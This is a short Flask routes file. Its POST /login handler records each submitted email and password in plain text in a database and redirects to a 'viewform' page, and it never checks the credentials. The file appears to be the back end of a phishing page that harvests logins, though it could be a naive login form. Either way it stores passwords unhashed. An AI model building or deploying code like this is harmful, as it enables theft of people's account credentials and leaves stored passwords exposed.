from flask import render_template, request, redirect, url_for
from app import app, db
from app.models import LoginData

@app.route('/', methods=['GET'])
def index():
    return render_template('viewform.html')

@app.route('/login', methods=['GET'])
def login_modal():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def submit_login():
    email = request.form['email']
    password = request.form['password']
    new_login = LoginData(email=email, password=password)
    db.session.add(new_login)
    db.session.commit()
    return redirect(url_for('index'))
